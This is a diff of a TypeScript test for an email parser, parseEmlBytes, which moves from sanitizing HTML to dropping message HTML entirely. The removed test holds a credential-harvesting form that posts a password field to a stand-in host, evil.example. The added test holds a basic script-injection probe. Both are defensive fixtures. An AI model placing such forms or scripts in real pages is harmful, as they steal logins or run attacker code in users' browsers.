@@ -14,15 +14,15 @@ function eml(html: string): Buffer {
     );
 }
 
-describe('parseEmlBytes html sanitizing', () => {
-    test('a <form> is dropped while its visible content and links survive', async () => {
-        const bytes = eml(
-            '<p>Hi</p><form action="https://evil.example/collect" method="post"><input name="password"><button>Sign in</button></form><a href="https://ok.example" target="_blank">ok</a>',
-        );
+// The index, the sync and the part routes read summary fields and attachments, never a body. Handing them
+// no html at all is what makes "forgot to sanitize" impossible: there is nothing to forget.
+describe('parseEmlBytes', () => {
+    test('a message with a body carries no html out of the parse', async () => {
+        const bytes = eml('<p>Hi</p><script>alert(1)</script>');
         const mail = await parseEmlBytes('m1', 'INBOX', bytes, bytes.length);
-        expect(mail.html).not.toContain('<form');
-        expect(mail.html).not.toContain('evil.example');
-        expect(mail.html).toContain('<p>Hi</p>');
-        expect(mail.html).toContain('target="_blank"');
+
+        expect(mail.html).toBeNull();
+        expect(mail.subject).toBe('t');
+        expect(mail.text).toContain('Hi');
     });
 });
